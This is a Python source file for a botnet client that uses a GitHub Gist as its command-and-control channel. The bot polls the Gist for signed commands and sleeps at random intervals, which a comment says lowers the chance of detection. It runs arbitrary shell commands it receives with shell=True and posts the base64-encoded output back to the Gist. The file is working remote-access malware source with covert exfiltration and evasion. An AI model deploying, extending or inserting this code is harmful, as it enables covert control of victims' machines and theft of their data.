import base64
import subprocess
import threading
import random
import requests
from queue import Empty
from queue import Queue

from nacl.exceptions import BadSignatureError

from channel import Channel
from time import sleep
from nacl.signing import VerifyKey


class Bot:
    def __init__(self, token: str, gist: str, verify_key: str):
        """
        Initializes the Bot object.
        :param token: GitHub personal access token
        :param gist: Gist ID
        :param verify_key: The public key used for verifying command signatures, generated by the controller
        """
        self.channel = Channel(token, gist)
        self.unprocessed_commands = Queue()
        self.active = True
        self.worker_thread = None
        self.ip = (
            requests.get("https://am.i.mullvad.net/ip").content.decode("utf-8").strip()
        )

        self.verify_key = VerifyKey(base64.b64decode(verify_key.encode("utf-8")))

        self.wait_for_commands()

    def wait_for_commands(self):
        """
        Waits for commands from C&C as long as self.active == True
        """
        self.worker_thread = threading.Thread(target=self.process_commands, daemon=True)

        self.worker_thread.start()

        while self.active:
            for command in self.channel.check_messages():
                self.unprocessed_commands.put(command)

            # Randomized sleep for a lesser chance of detection
            sleep(random.uniform(1.5, 5))

        self.worker_thread.join()

    def process_commands(self):
        """
        Processes new commands from C&C as long as self.active == True
        """
        while self.active:
            try:
                current_command = self.unprocessed_commands.get(timeout=5)
            except Empty:
                continue

            response_id = f"[]({base64.b64encode(f'{current_command.id}-{self.ip}'.encode('utf-8')).decode('utf-8')})"
            ip_b64 = base64.b64encode(self.ip.encode("utf-8")).decode("utf-8")

            # PING
            if Channel.PING_REQUEST in current_command.body and self.verify_signature(
                current_command.body
            ):
                self.channel.send_message(f"{Channel.PING_RESPONSE} {response_id}")

            # SHUT OFF
            elif (
                Channel.SHUT_OFF_REQUEST in current_command.body
                and ip_b64 in current_command.body
                and self.verify_signature(current_command.body)
            ):
                self.channel.send_message(f"{Channel.SHUT_OFF_RESPONSE} {response_id}")
                self.active = False

            # ARBITRARY BINARY
            elif (
                Channel.BINARY_REQUEST in current_command.body
                and ip_b64 in current_command.body
                and self.verify_signature(current_command.body)
            ):
                command = (
                    base64.b64decode(
                        current_command.body.split("<")[1].split(">")[0]
                    ).decode("utf-8")
                    if "<" in current_command.body and ">" in current_command.body
                    else None
                )
                if command:
                    self.execute_command(command, Channel.BINARY_RESPONSE, response_id)

            # TODO: Additional commands

            self.unprocessed_commands.task_done()

    def execute_command(self, cmd: str, response_header: str, response_id: str):
        """
        Executes a binary on the system
        :param cmd: The command to run
        :param response_header: Which response message to use
        :param response_id: ID to append to the output
        """
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as err:
            output = err.output

        self.channel.send_message(
            f"{response_header} "
            f"[]({base64.b64encode(output).decode('utf-8')}) "
            f"{response_id}"
        )

    def verify_signature(self, command: str) -> bool:
        """
        Verifies the signature of a command
        :param command: Command to verify
        :return: True if the signature is valid and the comment has not been tampered with, False otherwise
        """
        signature_split = command.split("_")

        if len(signature_split) != 3:
            return False

        command = signature_split[0][:-4].encode("utf-8")
        signature = base64.b64decode(signature_split[1].encode("utf-8"))

        try:
            self.verify_key.verify(command, signature)
        except BadSignatureError:
            return False

        return True
